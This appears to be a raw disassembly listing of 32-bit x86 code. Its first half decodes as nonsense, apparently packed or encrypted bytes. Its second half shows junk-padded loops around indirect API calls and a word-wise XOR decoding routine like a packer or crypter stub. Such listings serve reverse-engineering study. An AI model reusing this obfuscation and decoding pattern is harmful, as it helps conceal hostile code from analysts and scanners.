  410b80:	push   DWORD PTR [ebp-0x49b779e4]
  410b86:	mov    ss,edi
  410b88:	leave  
  410b89:	mov    WORD PTR [eax-0x42],es
  410b8c:	add    DWORD PTR [ecx-0x6d9317ae],esi
  410b92:	shr    DWORD PTR [edi-0x9],0xd8
  410b96:	mov    eax,ds:0x58423426
  410b9b:	arpl   WORD PTR cs:[ecx+eiz*2-0x40ba3506],si
  410ba3:	inc    ecx
  410ba4:	loope  0x410bde
  410ba6:	outs   dx,BYTE PTR ds:[esi]
  410ba7:	mov    ds:0x53ed805a,al
  410bac:	mov    edi,DWORD PTR [edi+0x7a77bd6a]
  410bb2:	in     al,0xcb
  410bb4:	and    esp,esi
  410bb6:	dec    esp
  410bb7:	add    al,0xbe
  410bb9:	or     eax,ebp
  410bbb:	cmp    al,0x1
  410bbd:	xor    dh,BYTE PTR [esi-0xab2ec9d]
  410bc3:	sub    ch,BYTE PTR [eax+0x39]
  410bc6:	leave  
  410bc7:	enter  0x4f92,0x0
  410bcb:	inc    esi
  410bcc:	cmc    
  410bcd:	adc    DWORD PTR [edi+edx*4+0x21719403],ebp
  410bd4:	push   esi
  410bd5:	cmp    ecx,ebx
  410bd7:	jb     0x410b8b
  410bd9:	test   eax,0xcf0a26d8
  410bde:	(bad)  
  410bdf:	mov    dh,0x85
  410be1:	jbe    0x410c34
  410be3:	mov    eax,0x5b4c3a01
  410be8:	mov    WORD PTR ds:[ebx-0x29b652ba],?
  410bef:	jge    0x410bd1
  410bf1:	repnz fisttp WORD PTR [ebx]
  410bf4:	js     0x410c3e
  410bf6:	and    BYTE PTR [esp+ebx*2-0x45],al
  410bfa:	xchg   edx,eax
  410bfb:	ffreep st(3)
  410bfd:	aaa    
  410bfe:	cmp    ch,BYTE PTR [eax]
  410c00:	das    
  410c01:	mov    esi,0x99cdc4b3
  410c06:	fiadd  WORD PTR [esi+0x3d]
  410c09:	and    DWORD PTR [edx+edi*8+0x3bbf1ed5],ebx
  410c10:	jl     0x410bc2
  410c12:	jbe    0x410c5d
  410c14:	xor    BYTE PTR [ecx-0x32],bl
  410c17:	(bad)  
  410c18:	cmp    DWORD PTR [edx],ebx
  410c1a:	sar    BYTE PTR [edi+0x151b5d51],cl
  410c20:	pop    ebp
  410c21:	cmp    al,0x49
  410c23:	loop   0x410c47
  410c25:	pop    edi
  410c26:	das    
  410c27:	xchg   esp,eax
  410c28:	shl    BYTE PTR [edx+0x3b921435],cl
  410c2e:	ud1    edi,DWORD PTR [edi]
  410c31:	test   BYTE PTR [edx+ebx*8+0x3a8ee850],ah
  410c38:	mov    bl,0x2c
  410c3a:	mov    bl,BYTE PTR [edi]
  410c3c:	iret   
  410c3d:	popa   
  410c3e:	push   cs
  410c3f:	sbb    al,0xe8
  410c41:	test   BYTE PTR [eax],0x9
  410c44:	and    esi,DWORD PTR [edx]
  410c46:	push   es
  410c47:	scas   al,BYTE PTR es:[edi]
  410c48:	mul    DWORD PTR [esi]
  410c4a:	dec    esi
  410c4b:	and    dh,ch
  410c4d:	adc    eax,0x9e62c06b
  410c52:	push   esi
  410c53:	or     ch,BYTE PTR [edx]
  410c55:	ja     0x410c35
  410c57:	xor    ebx,DWORD PTR [edx]
  410c59:	fld    DWORD PTR ds:0x6b089a74
  410c5f:	mov    esp,0x2507695a
  410c64:	cdq    
  410c65:	xlat   BYTE PTR ds:[ebx]
  410c66:	(bad)  [ebp+0x31]
  410c69:	test   DWORD PTR [edi+0x3a8374f9],ebp
  410c6f:	retf   0x72be
  410c72:	es xor al,ah
  410c75:	les    esp,FWORD PTR [eax]
  410c77:	sbb    cl,bh
  410c79:	cmp    eax,0x2314ef0d
  410c7e:	sbb    BYTE PTR [esi+0x7],bl
  410c81:	dec    BYTE PTR [ecx+eax*2+0xee16598]
  410c88:	cdq    
  410c89:	jmp    0xc0bd8492
  410c8e:	fdivr  st,st(2)
  410c90:	push   edx
  410c91:	ins    DWORD PTR es:[edi],dx
  410c92:	popf   
  410c93:	data16 mov ah,0x15
  410c96:	or     dl,BYTE PTR [eax+0x3930644a]
  410c9c:	or     eax,0x4b903ee7
  410ca1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ca2:	mov    ch,0xc2
  410ca4:	mov    ebx,0xd96162f1
  410ca9:	dec    ebx
  410caa:	or     eax,DWORD PTR [edi+0x6f12294a]
  410cb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cb1:	mov    cs,WORD PTR [edi]
  410cb3:	lods   eax,DWORD PTR ds:[esi]
  410cb4:	cmp    ecx,DWORD PTR [edx]
  410cb6:	inc    ecx
  410cb7:	inc    ebx
  410cb8:	loopne 0x410cdc
  410cba:	ja     0x410d2c
  410cbc:	dec    edi
  410cbd:	xchg   al,bl
  410cbf:	mov    ebp,esi
  410cc1:	mov    esp,0xd903db6
  410cc6:	mov    ds:0xc57bc817,eax
  410ccb:	mov    bl,0x79
  410ccd:	push   eax
  410cce:	imul   edi,edi,0xa5578787
  410cd4:	cmp    DWORD PTR ds:0x1114c71d,ecx
  410cda:	rcl    BYTE PTR [esi],1
  410cdc:	in     eax,0xc4
  410cde:	sti    
  410cdf:	(bad)  
  410ce0:	or     edi,DWORD PTR [edi+0x6e7b32a6]
  410ce6:	jecxz  0x410cac
  410ce8:	call   0x450d:0x38b27a7b
  410cef:	inc    edi
  410cf0:	adc    BYTE PTR [eax+0x49193fa9],al
  410cf6:	add    ch,ch
  410cf8:	mov    bh,0x9b
  410cfa:	jecxz  0x410cac
  410cfc:	add    eax,ebp
  410cfe:	ins    BYTE PTR es:[edi],dx
  410cff:	jecxz  0x410d01
  410d01:	xchg   ecx,eax
  410d02:	inc    esp
  410d03:	cs pop ebp
  410d05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d06:	add    DWORD PTR [ebp-0x5b],0xffffff8f
  410d0a:	jo     0x410d4b
  410d0c:	retf   
  410d0d:	mov    DWORD PTR [edi+eiz*8-0x6],esi
  410d11:	mov    WORD PTR [edx],cs
  410d13:	mov    ah,BYTE PTR [ebp+0x45e79c59]
  410d19:	adc    bl,BYTE PTR [eax]
  410d1b:	adc    al,0xf2
  410d1d:	or     BYTE PTR [edx],bh
  410d1f:	sbb    ebp,eax
  410d21:	mov    bh,0x53
  410d23:	or     eax,ecx
  410d25:	repz retf 
  410d27:	jge    0x410d23
  410d29:	jecxz  0x410d3f
  410d2b:	pop    eax
  410d2c:	add    eax,0x8eaa5473
  410d31:	les    ebp,FWORD PTR [eax-0x4a]
  410d34:	sbb    eax,0xe6f4aa3f
  410d39:	stos   DWORD PTR es:[edi],eax
  410d3a:	repnz cmp DWORD PTR [ebp-0x7e3d51be],esp
  410d41:	cmp    ax,0x431e
  410d45:	aaa    
  410d46:	and    DWORD PTR [edx+0x33d5dce4],ebp
  410d4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d4d:	fimul  DWORD PTR [eax-0x152dc588]
  410d53:	fdiv   DWORD PTR [ecx+0x4c3107e3]
  410d59:	call   0xd25f:0x741eb8a3
  410d60:	cs jg  0x410d1c
  410d63:	and    dl,BYTE PTR [edx]
  410d65:	shl    BYTE PTR [edx+0x26],1
  410d68:	mov    al,ds:0xeb8ca8aa
  410d6d:	sbb    DWORD PTR [edx],ebp
  410d6f:	push   ss
  410d70:	loope  0x410d47
  410d72:	fistp  QWORD PTR [eax-0x4e]
  410d75:	xor    DWORD PTR [eax+0x4],esp
  410d78:	jnp    0x410d33
  410d7a:	(bad)  
  410d7b:	lock or DWORD PTR [ecx+0x1b7192a4],0x1e
  410d83:	xchg   ebx,eax
  410d84:	out    0xeb,al
  410d86:	mov    bl,BYTE PTR [ebp+edx*2+0x68]
  410d8a:	mov    bh,0xc1
  410d8c:	mov    ebx,0x5e17bd32
  410d91:	jecxz  0x410d17
  410d93:	or     bh,BYTE PTR [edi]
  410d95:	adc    al,0x8d
  410d97:	int3   
  410d98:	inc    esi
  410d99:	enter  0xaa90,0x7f
  410d9d:	push   edi
  410d9e:	dec    ecx
  410d9f:	aad    0x66
  410da1:	xor    eax,0xc45ca16c
  410da6:	or     ebp,edi
  410da8:	cmp    dh,BYTE PTR [edx-0x5b]
  410dab:	aas    
  410dac:	popf   
  410dad:	nop
  410dae:	clc    
  410daf:	(bad)  
  410db0:	xor    BYTE PTR [eax+0x43],bl
  410db3:	jae    0x410de3
  410db5:	test   DWORD PTR [ecx+eiz*1+0x68],ebx
  410db9:	cdq    
  410dba:	xchg   esp,eax
  410dbb:	leave  
  410dbc:	add    eax,0x81bf4ef3
  410dc1:	cmp    al,0xa
  410dc3:	mov    eax,ds:0x7bc1bd7f
  410dc8:	add    dl,BYTE PTR [eax]
  410dca:	iret   
  410dcb:	pop    ebp
  410dcc:	push   ebx
  410dcd:	adc    dh,BYTE PTR [edx+0x5aa56dad]
  410dd3:	fldenv [edi+0x70e4c08a]
  410dd9:	sbb    ah,BYTE PTR [edx]
  410ddb:	and    ecx,DWORD PTR [esi]
  410ddd:	cmp    dh,al
  410ddf:	cs js  0x410dfb
  410de2:	bound  esi,QWORD PTR [ecx+0x66]
  410de5:	jne    0x410dea
  410de7:	stos   BYTE PTR es:[edi],al
  410de8:	sub    DWORD PTR [eax],ebx
  410dea:	ffreep st(1)
  410dec:	and    eax,0xf8b675c8
  410df1:	inc    edi
  410df2:	dec    esp
  410df3:	(bad)
  410df7:	popa   
  410df8:	dec    edx
  410df9:	inc    esi
  410dfa:	xor    DWORD PTR [edx+0x5a],esi
  410dfd:	ja     0x410e76
  410dff:	push   es
  410e00:	push   esi
  410e01:	loopne 0x410dc6
  410e03:	sub    eax,0x9179fc1e
  410e08:	xchg   BYTE PTR [eax+eiz*1],ch
  410e0b:	pop    fs
  410e0d:	or     eax,0xabff78b9
  410e12:	pop    ebp
  410e13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e14:	sbb    DWORD PTR [ebx-0x3d],ebx
  410e17:	dec    ebx
  410e18:	lock jl 0x410db6
  410e1b:	rcl    DWORD PTR [eax+0x4f33e95f],cl
  410e21:	in     eax,0x31
  410e23:	mov    ds,WORD PTR [esi]
  410e25:	push   0x362794e2
  410e2a:	lahf   
  410e2b:	enter  0x7a21,0x6a
  410e2f:	sub    DWORD PTR [edi],esp
  410e31:	pusha  
  410e32:	arpl   WORD PTR [eax+0x5d4cfb65],di
  410e38:	iret   
  410e39:	adc    bl,BYTE PTR [edi+edi*4-0x5377dbfc]
  410e40:	fnsetpm(287 only) 
  410e42:	or     bl,al
  410e44:	push   esp
  410e45:	lock jnp 0x410dfe
  410e48:	nop
  410e49:	add    eax,edi
  410e4b:	sbb    BYTE PTR [edx],bh
  410e4d:	pop    ebp
  410e4e:	and    edx,DWORD PTR [eax]
  410e50:	bound  edx,QWORD PTR [ecx-0x23db366c]
  410e56:	xchg   edx,edi
  410e58:	aaa    
  410e59:	and    DWORD PTR [esi],0xe369aa25
  410e5f:	jo     0x410df1
  410e61:	cld    
  410e62:	ret    0xaa67
  410e65:	sub    esi,esp
  410e67:	pop    ebp
  410e68:	or     BYTE PTR [ebx+0x6b],ch
  410e6b:	inc    esp
  410e6c:	xor    dh,ah
  410e6e:	mov    dh,0xb8
  410e70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e71:	cmp    ah,BYTE PTR [edi]
  410e73:	add    al,0xfc
  410e75:	scas   eax,DWORD PTR es:[edi]
  410e76:	xor    BYTE PTR [edi-0x6f358c42],ah
  410e7c:	dec    esi
  410e7d:	sbb    al,dh
  410e7f:	mov    ds:0x9662b467,al
  410e84:	dec    edx
  410e85:	shl    DWORD PTR [eax+0x1],cl
  410e88:	mov    esp,edx
  410e8a:	mov    bl,0x1
  410e8c:	cmp    DWORD PTR [esi+ecx*8-0x68],esp
  410e90:	test   DWORD PTR [edi-0x68],ebx
  410e93:	sub    al,0xb5
  410e95:	inc    ebp
  410e96:	stos   DWORD PTR es:[edi],eax
  410e97:	fucomi st,st(0)
  410e99:	lds    edx,FWORD PTR [esi]
  410e9b:	xchg   esi,eax
  410e9c:	adc    DWORD PTR [ebx+edi*2-0x69],eax
  410ea0:	fdivr  QWORD PTR [esi+ebx*8+0x79]
  410ea4:	pop    edi
  410ea5:	or     al,0xc8
  410ea7:	or     al,0x45
  410ea9:	mov    eax,0x5d3bd44a
  410eae:	cmp    ebx,esi
  410eb0:	sub    esp,DWORD PTR [esi+0x244bdfa8]
  410eb6:	xchg   edi,eax
  410eb7:	repz pop edi
  410eb9:	mov    ch,0x63
  410ebb:	lock (bad) 
  410ebd:	mov    ds:0xa55f14cc,al
  410ec2:	sub    BYTE PTR [eax+edi*4+0x78],bl
  410ec6:	sbb    al,0xd9
  410ec8:	jmp    0x410f09
  410eca:	jl     0x410e9d
  410ecc:	add    al,0x8
  410ece:	out    0xf2,eax
  410ed0:	jle    0x410e9e
  410ed2:	jo     0x410eb3
  410ed4:	je     0x410ed7
  410ed6:	(bad)  
  410ed7:	jae    0x410e75
  410ed9:	out    dx,eax
  410eda:	sub    eax,0x31af809c
  410edf:	xor    BYTE PTR [ebx-0x226e6c50],ah
  410ee5:	fstp   DWORD PTR [esp+ecx*1-0x13]
  410ee9:	xor    BYTE PTR [esi-0x79b4bf99],0xff
  410ef0:	les    edi,FWORD PTR [edx+ebp*4-0x17]
  410ef4:	xchg   esp,eax
  410ef5:	dec    eax
  410ef6:	loop   0x410eb3
  410ef8:	bound  esi,QWORD PTR [edi+0x68]
  410efb:	retf   
  410efc:	cmp    DWORD PTR [ecx],esi
  410efe:	mov    esp,0xab94bc57
  410f03:	pop    edi
  410f05:	or     al,0x69
  410f07:	repz repz ja 0x410f88
  410f0b:	add    dl,bl
  410f0d:	mov    edx,0x69f5b0ef
  410f12:	in     eax,0xb5
  410f14:	jg     0x410ea8
  410f16:	cld    
  410f17:	hlt    
  410f18:	js     0x410f0e
  410f1a:	adc    edi,0x22
  410f1d:	ds ins BYTE PTR es:[edi],dx
  410f1f:	cdq    
  410f20:	jb     0x410f3f
  410f22:	pushf  
  410f23:	mov    eax,ds:0x93a88e9
  410f28:	pop    ss
  410f29:	neg    DWORD PTR [ebp-0xf]
  410f2c:	pop    ds
  410f2d:	les    edi,FWORD PTR fs:[edi+eax*2+0x44]
  410f32:	aas    
  410f33:	into   
  410f34:	add    bh,0x17
  410f37:	gs addr16 ja 0x410f3f
  410f3b:	pop    ecx
  410f3c:	aaa    
  410f3d:	fs aad 0xbb
  410f40:	test   al,0xd6
  410f42:	mov    al,BYTE PTR [ebp+0x4bd83ab0]
  410f48:	ja     0x410f35
  410f4a:	or     DWORD PTR [ebp-0x74],ecx
  410f4d:	out    dx,eax
  410f4e:	aaa    
  410f4f:	sub    al,0x49
  410f51:	or     BYTE PTR [edx-0x63],cl
  410f54:	test   BYTE PTR [eax],ch
  410f56:	or     cl,BYTE PTR [edi]
  410f58:	xor    ah,BYTE PTR [edx-0x2]
  410f5b:	xor    eax,0x1f430f4e
  410f60:	xchg   ecx,eax
  410f61:	sub    cl,BYTE PTR [esi]
  410f63:	dec    edi
  410f64:	xchg   esi,eax
  410f65:	pop    eax
  410f66:	jno    0x410f17
  410f68:	out    0x86,al
  410f6a:	jmp    0x410f21
  410f6c:	out    0x92,eax
  410f6e:	aas    
  410f6f:	inc    ebp
  410f70:	gs mov dh,0xfb
  410f73:	xor    DWORD PTR [esi-0x30],edi
  410f76:	mov    fs:0x71d00eb,al
  410f7c:	(bad)  
  410f7d:	popa   
  410f7e:	or     esi,DWORD PTR [eax+0x5b3d5596]
  410f84:	add    BYTE PTR [esi],ah
  410f86:	ja     0x410f78
  410f88:	cdq    
  410f89:	sti    
  410f8a:	call   0xf947dc67
  410f8f:	inc    edi
  410f90:	nop
  410f91:	ret    
  410f92:	cld    
  410f93:	in     al,0x73
  410f95:	push   cs
  410f96:	and    esp,DWORD PTR [ecx]
  410f98:	inc    edi
  410f99:	bound  ebp,QWORD PTR [edx-0x9]
  410f9c:	push   ds
  410f9d:	adc    BYTE PTR [ebx-0x69dccb87],dl
  410fa3:	dec    eax
  410fa4:	nop
  410fa5:	test   al,0xd2
  410fa7:	mov    edx,0xcb730ad5
  410fac:	xchg   ebp,eax
  410fad:	mov    WORD PTR ds:0xce256c56,gs
  410fb3:	push   ecx
  410fb4:	stc    
  410fb5:	test   esi,0xe94732ae
  410fbb:	pop    eax
  410fbc:	dec    ecx
  410fbd:	or     eax,0x566756b6
  410fc2:	xor    bl,BYTE PTR [ecx+ecx*4]
  410fc5:	stos   BYTE PTR es:[edi],al
  410fc6:	dec    edx
  410fc7:	lock mov ecx,0x27ddfe62
  410fcd:	scas   al,BYTE PTR es:[edi]
  410fce:	or     al,0x46
  410fd0:	fcomp  QWORD PTR [ecx-0x48]
  410fd3:	adc    al,0x13
  410fd5:	ds mov al,0xb9
  410fd8:	cmp    al,0x5b
  410fda:	repnz imul ah
  410fdd:	sub    cl,BYTE PTR [edx-0x427e6851]
  410fe3:	into   
  410fe4:	pop    edx
  410fe5:	push   cs
  410fe6:	ret    0xadb
  410fe9:	out    0xfc,al
  410feb:	mov    BYTE PTR ds:0xf66cf5c2,bh
  410ff1:	daa    
  410ff2:	lahf   
  410ff3:	mov    al,ds:0x4eb41cd4
  410ff8:	jecxz  0x410f84
  410ffa:	clc    
  410ffb:	or     bh,dl
  410ffd:	sbb    dl,BYTE PTR [edx+0x3e6cb6c5]
  411003:	(bad)  
  411005:	inc    esi
  411006:	fstp   DWORD PTR [edi-0x6a34403a]
  41100c:	jmp    0x410fc2
  41100e:	sbb    DWORD PTR [ebx],edi
  411010:	pop    ebx
  411011:	sub    DWORD PTR [esi],ecx
  411013:	loope  0x410fdc
  411015:	rol    DWORD PTR [edi-0x46],1
  411018:	fs or  esi,ebp
  41101b:	add    DWORD PTR [ebx],eax
  41101d:	sbb    eax,DWORD PTR [edi]
  41101f:	mov    dh,0x10
  411021:	jmp    0x410fd8
  411023:	les    ecx,FWORD PTR [ebx-0x7247f7b3]
  411029:	mov    al,BYTE PTR [eax]
  41102b:	add    BYTE PTR [esi+0x33],ah
  41102e:	inc    ecx
  41102f:	and    BYTE PTR [ecx+0x42b00015],al
  411035:	add    BYTE PTR [eax],ah
  411037:	adc    eax,0x51b90000
  41103c:	cmp    eax,DWORD PTR [eax]
  41103e:	add    BYTE PTR [ecx+0x42a0080d],al
  411044:	add    dl,dh
  411046:	push   edx
  411047:	add    BYTE PTR [eax],al
  411049:	add    ax,cx
  41104c:	or     DWORD PTR ds:0x42c010,ebx
  411052:	movzx  eax,ax
  411055:	mov    DWORD PTR [ebp-0x10],eax
  411058:	xor    DWORD PTR ds:0x429020,ecx
  41105e:	mov    BYTE PTR [ebp-0x1],0x7d
  411062:	lea    eax,[ebp-0x1]
  411065:	and    ecx,DWORD PTR ds:0x429024
  41106b:	mov    DWORD PTR [ebp-0xc],eax
  41106e:	mov    al,BYTE PTR [ebp-0x1]
  411071:	mov    ecx,DWORD PTR [ebp-0xc]
  411074:	xor    DWORD PTR ds:0x42d014,0x42a010
  41107e:	xor    al,0x74
  411080:	sub    al,0x8
  411082:	add    DWORD PTR ds:0x42901c,0x5bfc
  41108c:	mov    BYTE PTR [ecx],al
  41108e:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  411095:	and    DWORD PTR ds:0x42d004,0x0
  41109f:	jmp    0x4110b3
  4110a4:	xor    ecx,ecx
  4110a6:	add    ecx,DWORD PTR ds:0x42d004
  4110ac:	inc    ecx
  4110ad:	mov    DWORD PTR ds:0x42d004,ecx
  4110b3:	cmp    DWORD PTR ds:0x42d004,0x1a
  4110ba:	jae    0x4110fe
  4110c0:	cmp    DWORD PTR ds:0x42d004,0x5
  4110c7:	jne    0x4110d3
  4110cd:	call   DWORD PTR ds:0x42e8f3
  4110d3:	cmp    DWORD PTR ds:0x42d004,0x4
  4110da:	jne    0x4110ef
  4110e0:	xor    ecx,ecx
  4110e2:	xor    ecx,DWORD PTR ds:0x42d004
  4110e8:	inc    ecx
  4110e9:	mov    DWORD PTR ds:0x42d004,ecx
  4110ef:	jmp    0x4110a4
  4110f4:	mov    DWORD PTR ds:0x42901c,0x6887
  4110fe:	push   ebx
  4110ff:	and    DWORD PTR ds:0x42c008,0x0
  411109:	jmp    0x411119
  41110e:	mov    eax,ds:0x42c008
  411113:	inc    eax
  411114:	mov    ds:0x42c008,eax
  411119:	cmp    DWORD PTR ds:0x42c008,0x19
  411120:	jae    0x4111a1
  411126:	cmp    DWORD PTR ds:0x42c008,0x5
  41112d:	jne    0x41113e
  411133:	push   0x42e000
  411138:	call   DWORD PTR ds:0x42e8f7
  41113e:	cmp    DWORD PTR ds:0x42c008,0x4
  411145:	jne    0x411156
  41114b:	mov    eax,ds:0x42c008
  411150:	inc    eax
  411151:	mov    ds:0x42c008,eax
  411156:	jmp    0x41110e
  41115b:	and    DWORD PTR ds:0x429024,0x0
  411165:	mov    ecx,DWORD PTR ds:0x429024
  41116b:	inc    ecx
  41116c:	mov    DWORD PTR ds:0x429024,ecx
  411172:	cmp    DWORD PTR ds:0x429024,0x21
  411179:	jne    0x411192
  41117f:	push   DWORD PTR [ebp-0x14]
  411182:	push   0x42d018
  411187:	push   0x6b2d
  41118c:	call   DWORD PTR ds:0x42e8bf
  411192:	cmp    DWORD PTR ds:0x429024,0x17
  411199:	jb     0x411165
  41119f:	xor    eax,eax
  4111a1:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  4111a8:	and    DWORD PTR ds:0x42a008,0x0
  4111b2:	jmp    0x4111c5
  4111b7:	xor    eax,eax
  4111b9:	or     eax,DWORD PTR ds:0x42a008
  4111bf:	inc    eax
  4111c0:	mov    ds:0x42a008,eax
  4111c5:	cmp    DWORD PTR ds:0x42a008,0x14
  4111cc:	jae    0x41120d
  4111d2:	cmp    DWORD PTR ds:0x42a008,0x5
  4111d9:	jne    0x4111ea
  4111df:	push   0x42e067
  4111e4:	call   DWORD PTR ds:0x42e8fb
  4111ea:	cmp    DWORD PTR ds:0x42a008,0x4
  4111f1:	jne    0x411202
  4111f7:	mov    eax,ds:0x42a008
  4111fc:	inc    eax
  4111fd:	mov    ds:0x42a008,eax
  411202:	jmp    0x4111b7
  411207:	xor    DWORD PTR ds:0x42a018,edx
  41120d:	mov    ecx,DWORD PTR [ebp-0x18]
  411210:	dec    DWORD PTR ds:0x42a010
  411216:	push   esi
  411217:	mov    eax,0x751089b
  41121c:	mov    esi,DWORD PTR ds:0x41cda1
  411222:	mov    esi,DWORD PTR [esi]
  411224:	sub    DWORD PTR ds:0x429028,esi
  41122a:	xor    ecx,eax
  41122c:	inc    esi
  41122d:	mov    esi,0x3272e2
  411232:	add    DWORD PTR ds:0x42b008,0x42d010
  41123c:	push   edi
  41123d:	or     DWORD PTR ds:0x42b004,0x429028
  411247:	add    ecx,esi
  411249:	jmp    0x411277
  41124e:	mov    DWORD PTR ds:0x42c00c,0x285a
  411258:	mov    dl,BYTE PTR [ebp-0x1]
  41125b:	mov    DWORD PTR ds:0x42a00c,0x78fc
  411265:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  41126c:	mov    DWORD PTR ds:0x429024,0x3f09
  411276:	inc    ecx
  411277:	mov    DWORD PTR ds:0x42a00c,0x5b6f
  411281:	cmp    ecx,0x40
  411284:	mov    DWORD PTR ds:0x42d01c,0x4c47
  41128e:	jb     0x41124e
  411294:	mov    edx,DWORD PTR [ebp-0x18]
  411297:	xor    edx,eax
  411299:	add    edx,esi
  41129b:	jmp    0x41130b
  4112a0:	sub    edi,ecx
  4112a2:	mov    edi,DWORD PTR [ebp+0x8]
  4112a5:	add    ecx,0x4f49
  4112ab:	mov    ecx,0x8a8d
  4112b0:	xor    cx,WORD PTR [edi+edx*4+0x2]
  4112b5:	sub    edi,DWORD PTR ds:0x42b00c
  4112bb:	mov    edi,0x3b51
  4112c0:	xor    DWORD PTR ds:0x42c01c,0x429014
  4112ca:	add    cx,di
  4112cd:	movzx  ecx,cx
  4112d0:	mov    DWORD PTR [ebp-0xc],ecx
  4112d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d6:	sbb    DWORD PTR ds:0x42b000,0x42d008
  4112e0:	movzx  ecx,WORD PTR [ecx+edx*4]
  4112e4:	xor    ecx,0x8a8d
  4112ea:	adc    DWORD PTR ds:0x42b014,0x42b008
  4112f4:	add    ecx,edi
  4112f6:	mov    edi,DWORD PTR [ebp-0xc]
  4112f9:	mov    DWORD PTR ds:0x42b018,0x62b9
  411303:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  41130a:	inc    edx
  41130b:	mov    ecx,DWORD PTR [ebp-0x10]
  41130e:	mov    DWORD PTR ds:0x42a00c,0x6d31
  411318:	cmp    edx,ecx
  41131a:	mov    DWORD PTR ds:0x429018,0x5128
  411324:	jne    0x4112a0
  41132a:	mov    DWORD PTR ds:0x42c018,0x17
  411334:	cmp    DWORD PTR ds:0x42c018,0x0
  41133b:	je     0x411388
  411341:	cmp    DWORD PTR ds:0x42c018,0x8
  411348:	jne    0x411354
  41134e:	call   DWORD PTR ds:0x42e8ff
  411354:	cmp    DWORD PTR ds:0x42c018,0x9
  41135b:	jne    0x411370
  411361:	xor    edx,edx
  411363:	add    edx,DWORD PTR ds:0x42c018
  411369:	dec    edx
  41136a:	mov    DWORD PTR ds:0x42c018,edx
  411370:	mov    edx,DWORD PTR ds:0x42c018
  411376:	dec    edx
  411377:	mov    DWORD PTR ds:0x42c018,edx
  41137d:	jmp    0x411334
  411382:	adc    ecx,0x40c
  411388:	mov    ecx,DWORD PTR [ebp-0x18]
  41138b:	or     edi,edi
  41138d:	mov    edx,DWORD PTR [ebp+0x10]
  411390:	neg    edi
  411392:	xor    ecx,eax
  411394:	add    DWORD PTR ds:0x42b01c,ebx
  41139a:	add    ecx,esi
  41139c:	mov    DWORD PTR [edx],ecx
  41139e:	and    DWORD PTR ds:0x42b014,0x0
  4113a8:	mov    ecx,DWORD PTR ds:0x42b014
  4113ae:	inc    ecx
  4113af:	mov    DWORD PTR ds:0x42b014,ecx
  4113b5:	cmp    DWORD PTR ds:0x42b014,0x4
  4113bc:	jne    0x4113d5
  4113c2:	push   0x44ec
  4113c7:	push   0x42901c
  4113cc:	push   DWORD PTR [ebp-0x18]
  4113cf:	call   DWORD PTR ds:0x42e903
  4113d5:	cmp    DWORD PTR ds:0x42b014,0x3
  4113dc:	jne    0x4113ef
  4113e2:	mov    ecx,DWORD PTR ds:0x42b014
  4113e8:	inc    ecx
  4113e9:	mov    DWORD PTR ds:0x42b014,ecx
  4113ef:	cmp    DWORD PTR ds:0x42b014,0x13
  4113f6:	jb     0x4113a8
  4113fc:	or     edi,edi
  4113fe:	mov    ecx,DWORD PTR [ebp-0x18]
  411401:	xor    ecx,eax
  411403:	sbb    DWORD PTR ds:0x429004,0x2443
  41140d:	add    ecx,esi
  41140f:	mov    DWORD PTR [ebp-0xc],ecx
  411412:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  411419:	mov    DWORD PTR ds:0x429014,0x17
  411423:	cmp    DWORD PTR ds:0x429014,0x0
  41142a:	je     0x411491
  411430:	cmp    DWORD PTR ds:0x429014,0xb
  411437:	jne    0x411450
  41143d:	push   0x0
  41143f:	push   DWORD PTR [ebp-0x1c]
  411442:	push   0x533d
  411447:	push   DWORD PTR [ebp-0x10]
  41144a:	call   DWORD PTR ds:0x42e8c3
  411450:	cmp    DWORD PTR ds:0x429014,0xc
  411457:	jne    0x41146c
  41145d:	xor    ecx,ecx
  41145f:	or     ecx,DWORD PTR ds:0x429014
  411465:	dec    ecx
  411466:	mov    DWORD PTR ds:0x429014,ecx
  41146c:	mov    ecx,DWORD PTR ds:0x429014
  411472:	dec    ecx
  411473:	mov    DWORD PTR ds:0x429014,ecx
  411479:	jmp    0x411423
  41147e:	xor    edi,edi
  411480:	xor    edi,DWORD PTR ds:0x41cddc
  411486:	mov    ecx,DWORD PTR ds:0x41cd75
  41148c:	sub    ecx,edi
  41148e:	or     edi,DWORD PTR [edi+ecx*1]
  411491:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  411498:	mov    DWORD PTR [ebp-0x10],0xf89c9585
  41149f:	and    DWORD PTR ds:0x42d00c,0x0
  4114a9:	mov    ecx,DWORD PTR ds:0x42d00c
  4114af:	inc    ecx
  4114b0:	mov    DWORD PTR ds:0x42d00c,ecx
  4114b6:	cmp    DWORD PTR ds:0x42d00c,0x10
  4114bd:	jne    0x4114d5
  4114c3:	push   DWORD PTR [ebp-0xc]
  4114c6:	push   DWORD PTR [ebp-0x1c]
  4114c9:	push   DWORD PTR [ebp-0xc]
  4114cc:	push   DWORD PTR [ebp-0x10]
  4114cf:	call   DWORD PTR ds:0x42e8c7
  4114d5:	cmp    DWORD PTR ds:0x42d00c,0xf
  4114dc:	jne    0x4114ef
  4114e2:	mov    ecx,DWORD PTR ds:0x42d00c
  4114e8:	inc    ecx
  4114e9:	mov    DWORD PTR ds:0x42d00c,ecx
  4114ef:	cmp    DWORD PTR ds:0x42d00c,0x1c
  4114f6:	jb     0x4114a9
  4114fc:	mov    ecx,DWORD PTR [ebp-0x14]
  4114ff:	mov    DWORD PTR [ebp+0x8],ecx
  411502:	mov    ecx,DWORD PTR [ebp+0x8]
  411505:	mov    DWORD PTR ds:0x42d008,0x14
  41150f:	cmp    DWORD PTR ds:0x42d008,0x0
  411516:	je     0x411548
  41151c:	cmp    DWORD PTR ds:0x42d008,0x16
  411523:	jne    0x411534
  411529:	push   0x7bbf
  41152e:	call   DWORD PTR ds:0x42e8cb
  411534:	xor    edi,edi
  411536:	add    edi,DWORD PTR ds:0x42d008
  41153c:	dec    edi
  41153d:	mov    DWORD PTR ds:0x42d008,edi
